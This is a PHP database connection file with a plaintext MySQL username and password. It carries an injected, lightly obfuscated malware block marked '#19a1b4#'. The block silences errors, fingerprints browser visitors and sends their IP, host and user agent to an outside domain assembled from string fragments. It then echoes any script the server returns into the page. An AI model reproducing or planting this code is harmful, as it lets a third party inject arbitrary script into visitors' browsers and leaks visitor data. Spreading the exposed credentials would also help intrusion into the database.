<?php
$dbh=mysql_connect ("localhost", "etasa","DLA0duwIEGZ7E") or die ('I cannot connect to the database because: ' . mysql_error());
	mysql_select_db("etasa", $dbh) or die('I cannot connect to the database because: ' . mysql_error());
?>
<?php
#19a1b4#
error_reporting(0); @ini_set('display_errors',0);
$wp_xk81299 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_xk81299) && !preg_match ('/bot/i', $wp_xk81299))){
	$wp_xk0981299="http://"."tag"."display".".com/"."display"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_xk81299);

	if (function_exists('curl_init') && function_exists('curl_exec')) {
		$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_xk0981299); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$wp_81299xk = curl_exec ($ch);
		curl_close($ch);
	} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {
		$wp_81299xk = @file_get_contents($wp_xk0981299);
	}
	elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
		$wp_81299xk=@stream_get_contents(@fopen($wp_xk0981299, "r"));
	}
}
if (substr($wp_81299xk,1,3) === 'scr'){
	echo $wp_81299xk;
}
#/19a1b4#
?>